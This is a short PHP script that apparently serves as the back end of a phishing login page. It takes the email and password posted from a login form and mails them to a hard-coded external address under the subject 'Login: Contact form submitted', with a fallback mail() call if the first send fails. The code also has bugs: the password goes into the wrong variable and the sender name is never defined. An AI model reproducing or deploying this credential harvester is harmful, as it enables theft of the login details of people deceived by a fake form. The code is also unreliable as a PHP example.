<?php
if ((isset($_POST['email'])) && (strlen(trim($_POST['email'])) > 0)) {
    $email = stripslashes(strip_tags($_POST['email']));
} else {
    $email = 'No email entered';
}
if ((isset($_POST['password'])) && (strlen(trim($_POST['password'])) > 0)) {
    $message = stripslashes(strip_tags($_POST['password']));
} else {
    $password = 'No password entered';
}
ob_start();
?>
<html>
<head>
    <style type="text/css">
    </style>
</head>
<body>
<table width="550" border="0" cellspacing="0" cellpadding="15">
    <tr bgcolor="#eeeeff">
        <td>Email</td>
        <td><?php echo $email; ?></td>
    </tr>
    <tr bgcolor="#eeffee">
        <td>Password</td>
        <td><?php echo $password; ?></td>
    </tr>
</table>
</body>
</html>
<?php
$body = ob_get_contents();

$to = 'naresh@csoft.co.in';
$toname = 'Your Name';
//$anotheraddress = 'email@example.com';
//$anothername = 'Another Name';

require("phpmailer.php");

$mail = new PHPMailer();

$mail->From = $email;
$mail->FromName = $name;
$mail->AddAddress($to, $toname); // Put your email
//$mail->AddAddress($anotheraddress,$anothername); // addresses here

$mail->WordWrap = 50;
$mail->IsHTML(true);

$mail->Subject = "Login:  Contact form submitted";
$mail->Body = $body;
$mail->AltBody = $message;

if (!$mail->Send()) {
    $recipient = $to;
    $subject = 'Login form failed';
    $content = $body;
    mail($recipient, $subject, $content, "From: $name\r\nReply-To: $email\r\nX-Mailer: DT_formmail");
    exit;
}
?>
